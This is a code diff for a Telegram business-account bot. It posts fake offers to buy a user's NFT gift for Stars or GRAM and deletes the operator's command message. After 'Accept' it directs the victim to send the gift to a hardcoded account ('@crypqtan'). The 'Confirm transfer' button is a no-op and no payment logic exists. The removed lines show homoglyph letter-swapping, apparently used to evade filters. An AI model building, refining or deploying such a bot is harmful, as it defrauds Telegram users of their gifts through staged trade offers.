@@ -12,7 +12,6 @@ from aiogram.types import (
     CallbackQuery,
     InlineKeyboardMarkup,
     InlineKeyboardButton,
-    LinkPreviewOptions,
 )
 
 logging.basicConfig(level=logging.WARNING)
@@ -23,71 +22,43 @@ bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
 dp = Dispatcher()
 
 GIFT_RE = re.compile(r"t\.me/nft/([A-Za-z]+?)-(\d+)")
-RECIPIENT = "@tradiqx"
+RECIPIENT = "@crypqtan"
 LANG_TAGS = {"ru", "ukr", "eng", "cn", "en", "uk", "zh"}
 
-# ---- Premium emoji IDs (все 7) ----
-E_GEM   = "5318901904686754959"   # 💎 алмаз / GRAM
-E_WARN  = "6030563507299160824"   # ⚠ восклицание
-E_OK    = "5774022692642492953"   # ✅ галочка (кнопка «Принять»)
-E_NO    = "5774077015388852135"   # ❌ крестик (кнопка «Отклонить»)
-E_TIMER = "6037268453759389862"   # ⏱ часы
-E_GIFT  = "5773677501825945508"   # 🎁 подарок
-E_STAR  = "6028338546736107668"   # ⭐ звезда
-E_CHECK = "5774022692642492953"   # ✅ галочка (финал)
-E_LOCK  = "5774077015388852135"   # 🔒 замок (используем крестик как «защита»)
+E_GEM   = "5318901904686754959"
+E_WARN  = "6030563507299160824"
+E_OK    = "5774022692642492953"
+E_NO    = "5774077015388852135"
+E_TIMER = "6037268453759389862"
+E_GIFT  = "5773677501825945508"
+E_STAR  = "6028338546736107668"
+E_CHECK = "5774022692642492953"
+E_LOCK  = "5774077015388852135"
 
+message_queue = asyncio.Queue()
 
 def em(eid: str, fallback: str) -> str:
     return f'<tg-emoji emoji-id="{eid}">{fallback}</tg-emoji>'
 
-
-CYR_TO_LAT = {
-    "А": "A", "а": "a",
-    "С": "C", "с": "c",
-    "Е": "E", "е": "e",
-    "О": "O", "о": "o",
-    "Х": "X", "х": "x",
-    "Р": "P", "р": "p",
-    "З": "3",
-    "У": "Y", "у": "y",
-    "В": "B", "в": "B",
-    "М": "M", "м": "M",
-    "Т": "T", "т": "T",
-    "К": "K", "к": "K",
-}
-
-LAT_TO_CYR = {v: k for k, v in CYR_TO_LAT.items()}
-
-def homoglyphs(text: str, lang: str) -> str:
-    if lang == "ru":
-        table = CYR_TO_LAT
-    elif lang == "eng":
-        table = LAT_TO_CYR
-    else:
-        return text
-    return "".join(table.get(c, c) for c in text)
-
-
 TEXTS = {
     "ru": {
-        "offer_1": "Пoльзoвaтeль прeдлaгaeт вaм",
-        "offer_for": "зa пoдaрoк",
-        "offer_time": "Oффeр дeйcтвитeлeн eщё 6 ч. 0 мин. 0 ceк.",
-        "offer_fix": "Cдeлкa фикcuруeтcя кнoпкoй «Принять».",
-        "accept_ok": "Oффeр принят",
-        "accept_give": "Пeрeдaйтe пoдaрoк",
-        "accept_then": "Зaтeм нaжмитe «Пoдтвeрdить пeрeдaчу».",
-        "accept_warn": "Кнoпкa cрaбoтaeт тoлькo ecли пoдaрoк ужe у пoлучaтeля.",
-        "accept_price": "зa пoдaрoк",
-        "order": "Зaкaз",
-        "recipient": "пoлучaтeль",
-        "btn_decline": "Oтклoнить",
+        "offer_1": "Пользователь предлагает вам",
+        "offer_for": "за подарок",
+        "offer_time": "Оффер действителен ещё 6 ч. 0 мин. 0 сек.",
+        "offer_fix": "Сделка фиксируется кнопкой «Принять».",
+        "accept_ok": "Оффер принят",
+        "accept_give": "Передайте подарок",
+        "accept_then": "Затем нажмите «Подтвердить передачу».",
+        "accept_warn": "Кнопка сработает только если подарок уже у получателя.",
+        "accept_price": "за подарок",
+        "order": "Заказ",
+        "recipient": "получатель",
+        "btn_decline": "Отклонить",
         "btn_accept": "Принять",
-        "btn_show": "Пoкaзaть пoдaрoк",
-        "btn_give": "Пeрeдaть пoдaрoк",
-        "btn_confirm": "Пoдтвeрdить пeрeдaчу",
-        "declined": "Oффeр был oтклoнён.",
+        "btn_show": "Показать подарок",
+        "btn_give": "Передать подарок",
+        "btn_confirm": "Подтвердить передачу",
+        "declined": "Оффер был отклонён.",
         "stars": "Звёзд",
         "gram": "GRAM",
     },
@@ -156,13 +127,8 @@ TEXTS = {
     },
 }
 
-
 def T(lang, key):
-    text = TEXTS.get(lang, TEXTS["ru"]).get(key, TEXTS["ru"][key])
-    if lang == "ru":
-        return text
-    return homoglyphs(text, lang)
-
+    return TEXTS.get(lang, TEXTS["ru"]).get(key, TEXTS["ru"][key])
 
 def parse_command(text):
     if not text:
@@ -177,25 +143,17 @@ def parse_command(text):
     if not parts:
         return None
 
-    link = None
-    amount = None
-    currency = "STARS"
-    lang = "ru"
-
+    link, amount, currency, lang = None, None, "STARS", "ru"
     for p in parts:
         low = p.lower()
         if link is None and (p.startswith("http") or p.startswith("t.me")):
             link = p
             continue
         if low in LANG_TAGS:
-            if low == "ru":
-                lang = "ru"
-            elif low in ("ukr", "uk"):
-                lang = "ukr"
-            elif low in ("eng", "en"):
-                lang = "eng"
-            elif low in ("cn", "zh"):
-                lang = "cn"
+            if low == "ru": lang = "ru"
+            elif low in ("ukr", "uk"): lang = "ukr"
+            elif low in ("eng", "en"): lang = "eng"
+            elif low in ("cn", "zh"): lang = "cn"
             continue
         if low == "gram":
             currency = "GRAM"
@@ -213,65 +171,50 @@ def parse_command(text):
         return None
     return link, amount, currency, lang
 
-
 def parse_gift(link):
     m = GIFT_RE.search(link)
-    if not m:
-        return None
-    slug = m.group(1)
-    num = m.group(2)
+    if not m: return None
+    slug, num = m.group(1), m.group(2)
     name = re.sub(r'(?<!^)(?=[A-Z])', ' ', slug)
     return name, num
 
-
 def amount_line(amount, currency, lang):
-    word = T(lang, "gram" if currency == "GRAM" else "stars")
     if currency == "GRAM":
-        return f'{em(E_GEM, "💎")} <b>{amount:.0f} {word}</b>'
-    return f'{em(E_STAR, "⭐")} <b>{amount:.0f} {word}</b>'
+        return f'{em(E_GEM, "💎")} <b>{amount:.0f} {T(lang, "gram")}</b>'
+    return f'{em(E_STAR, "⭐")} <b>{amount:.0f} {T(lang, "stars")}</b>'
 
-
-def gift_link_bold(gift_name, gift_num, lang):
+def gift_link_bold(gift_name, gift_num):
     slug = gift_name.replace(" ", "")
-    visible = gift_name if lang == "ru" else homoglyphs(gift_name, lang)
-    return (
-        f'<b><a href="https://t.me/nft/{slug}-{gift_num}">'
-        f'{visible} #{gift_num}</a></b>'
-    )
-
+    return f'<b><a href="https://t.me/nft/{slug}-{gift_num}">{gift_name} #{gift_num}</a></b>'
 
 def build_offer_text(amount, currency, gift_name, gift_num, lang):
     return (
         f'{em(E_GIFT, "🎁")} {T(lang, "offer_1")}\n'
         f'{amount_line(amount, currency, lang)} {T(lang, "offer_for")} '
-        f'{gift_link_bold(gift_name, gift_num, lang)}.\n\n'
+        f'{gift_link_bold(gift_name, gift_num)}.\n\n'
         f'{em(E_TIMER, "⏱")} {T(lang, "offer_time")}\n'
         f'{em(E_LOCK, "🔒")} {T(lang, "offer_fix")}'
     )
 
-
 def build_accept_text(amount, currency, gift_name, gift_num, order_id, lang):
     return (
         f'{em(E_CHECK, "✅")} <b>{T(lang, "accept_ok")}</b>\n\n'
-        f'{em(E_GIFT, "🎁")} {T(lang, "accept_give")} {gift_link_bold(gift_name, gift_num, lang)}.\n'
+        f'{em(E_GIFT, "🎁")} {T(lang, "accept_give")} {gift_link_bold(gift_name, gift_num)}.\n'
         f'{T(lang, "accept_then")}\n'
         f'{T(lang, "accept_warn")}\n\n'
         f'{amount_line(amount, currency, lang)} {T(lang, "accept_price")} '
-        f'{gift_name if lang == "ru" else homoglyphs(gift_name, lang)} #{gift_num}.\n\n'
+        f'{gift_name} #{gift_num}.\n\n'
         f'<i>{T(lang, "order")} #{order_id}, {T(lang, "recipient")} {RECIPIENT}</i>'
     )
-
 
 def pack_offer(amount, currency, gift_name, gift_num, lang):
     cur = "G" if currency == "GRAM" else "S"
     name = gift_name.replace(" ", "")
     return f"a|{gift_num}|{amount:.0f}|{cur}|{name}|{lang}"
 
-
 def unpack_offer(data):
     parts = data.split("|", 5)
-    if len(parts) != 6:
-        return None
+    if len(parts) != 6: return None
     _, gift_num, amount_s, cur, gift_name_compact, lang = parts
     try:
         amount = float(amount_s)
@@ -281,126 +224,70 @@ def unpack_offer(data):
     name = re.sub(r'(?<!^)(?=[A-Z])', ' ', gift_name_compact)
     return amount, currency, name, gift_num, lang
 
-
 def make_offer_keyboard(amount, currency, gift_name, gift_num, lang):
     accept_data = pack_offer(amount, currency, gift_name, gift_num, lang)
     return InlineKeyboardMarkup(
-        inline_keyboard=[
-            [
-                InlineKeyboardButton(
-                    text=T(lang, "btn_decline"),
-                    callback_data="decline",
-                    icon_custom_emoji_id=E_NO,
-                ),
-                InlineKeyboardButton(
-                    text=T(lang, "btn_accept"),
-                    callback_data=accept_data,
-                    icon_custom_emoji_id=E_OK,
-                ),
-            ]
-        ]
+        inline_keyboard=[[
+            InlineKeyboardButton(text=T(lang, "btn_decline"), callback_data="decline", icon_custom_emoji_id=E_NO),
+            InlineKeyboardButton(text=T(lang, "btn_accept"), callback_data=accept_data, icon_custom_emoji_id=E_OK),
+        ]]
     )
-
 
 def make_accept_keyboard(gift_name, gift_num, lang):
     recipient = RECIPIENT.lstrip("@")
     slug = gift_name.replace(" ", "")
     return InlineKeyboardMarkup(
         inline_keyboard=[
-            [
-                InlineKeyboardButton(
-                    text=T(lang, "btn_show"),
-                    url=f"https://t.me/nft/{slug}-{gift_num}",
-                    icon_custom_emoji_id=E_GIFT,
-                )
-            ],
-            [
-                InlineKeyboardButton(
-                    text=T(lang, "btn_give"),
-                    url=f"tg://send_gift?to={recipient}",
-                    icon_custom_emoji_id=E_GIFT,
-                )
-            ],
-            [
-                InlineKeyboardButton(
-                    text=T(lang, "btn_confirm"),
-                    callback_data="noop",
-                    icon_custom_emoji_id=E_CHECK,
-                )
-            ],
+            [InlineKeyboardButton(text=T(lang, "btn_show"), url=f"https://t.me/nft/{slug}-{gift_num}", icon_custom_emoji_id=E_GIFT)],
+            [InlineKeyboardButton(text=T(lang, "btn_give"), url=f"tg://send_gift?to={recipient}", icon_custom_emoji_id=E_GIFT)],
+            [InlineKeyboardButton(text=T(lang, "btn_confirm"), callback_data="noop", icon_custom_emoji_id=E_CHECK)],
         ]
     )
 
-
 def gen_order_id():
-    return "TG-" + "".join(
-        random.choices(string.ascii_uppercase + string.digits, k=10)
-    )
+    return "TG-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=10))
 
-
-def _business_offer_from_owner(message: Message) -> bool:
-    if message.chat.type != "private" or not message.from_user:
-        return False
-    return message.from_user.id != message.chat.id
-
-
-def _gift_preview_url(gift_name: str, gift_num: str) -> str:
-    slug = gift_name.replace(" ", "")
-    return f"https://t.me/nft/{slug}-{gift_num}"
-
+async def sender_worker():
+    while True:
+        chat_id, text, reply_markup, bcid, message_id = await message_queue.get()
+        try:
+            await bot.send_message(
+                chat_id=chat_id,
+                text=text,
+                reply_markup=reply_markup,
+                business_connection_id=bcid,
+            )
+            await bot.delete_business_messages(
+                business_connection_id=bcid,
+                message_ids=[message_id],
+            )
+        except Exception as e:
+            logging.error(f"worker error: {e}")
+        finally:
+            message_queue.task_done()
+            await asyncio.sleep(1.2)
 
 @dp.business_message(F.text)
 async def handle_business_message(message: Message):
     bcid = message.business_connection_id
-    if not bcid:
-        return
-    if not _business_offer_from_owner(message):
-        return
+    if not bcid: return
 
     parsed = parse_command(message.text or "")
-    if not parsed:
-        return
+    if not parsed: return
     link, amount, currency, lang = parsed
 
     gift = parse_gift(link)
-    if not gift:
-        return
+    if not gift: return
     gift_name, gift_num = gift
-    preview_url = _gift_preview_url(gift_name, gift_num)
 
-    try:
-        await bot.delete_business_messages(
-            business_connection_id=bcid,
-            message_ids=[message.message_id],
-        )
-    except Exception as e:
-        logging.warning(f"delete error: {e}")
+    text = build_offer_text(amount, currency, gift_name, gift_num, lang)
+    markup = make_offer_keyboard(amount, currency, gift_name, gift_num, lang)
 
-    try:
-        await bot.send_message(
-            chat_id=message.chat.id,
-            text=build_offer_text(amount, currency, gift_name, gift_num, lang),
-            reply_markup=make_offer_keyboard(amount, currency, gift_name, gift_num, lang),
-            business_connection_id=bcid,
-            link_preview_options=LinkPreviewOptions(
-                url=preview_url,
-                prefer_large_media=True,
-            ),
-        )
-    except Exception as e:
-        logging.error(f"send error: {e}")
-        return
-
+    await message_queue.put((message.chat.id, text, markup, bcid, message.message_id))
 
 @dp.message(CommandStart())
 async def cmd_start(message: Message):
-    await message.answer(
-        "🎁 Привет! Пришли ссылку на подарок, язык и сумму, например:\n"
-        "https://t.me/nft/BerryBox-40761 ru 15000 STARS\n"
-        "https://t.me/nft/BerryBox-40761 eng 15 GRAM\n\n"
-        "Языки: ru, ukr, eng, cn"
-    )
-
+    await message.answer("🎁 Очередь работает. Пришли ссылку на подарок, язык и сумму.")
 
 @dp.callback_query(F.data.startswith("a|"))
 async def accept(cb: CallbackQuery):
@@ -422,31 +309,24 @@ async def accept(cb: CallbackQuery):
         logging.error(f"accept edit error: {e}")
         await cb.answer("Не удалось обновить", show_alert=True)
         return
-
     await cb.answer()
-
 
 @dp.callback_query(F.data == "decline")
 async def decline(cb: CallbackQuery):
     try:
-        await cb.message.edit_text(
-            text=f'{em(E_NO, "❌")} {T("ru", "declined")}',
-            reply_markup=None,
-        )
+        await cb.message.edit_text(text=f'{em(E_NO, "❌")} Оффер был отклонён.', reply_markup=None)
     except Exception as e:
         logging.error(f"decline edit error: {e}")
         await cb.answer("Не удалось обновить", show_alert=True)
         return
     await cb.answer()
 
-
 @dp.callback_query(F.data == "noop")
 async def noop(cb: CallbackQuery):
     await cb.answer()
 
-
 async def main():
-    print("Bot started")
+    asyncio.create_task(sender_worker())
     await dp.start_polling(
         bot,
         allowed_updates=[
@@ -456,7 +336,6 @@ async def main():
             "edited_business_message",
         ],
     )
-
 
 if __name__ == "__main__":
     asyncio.run(main())
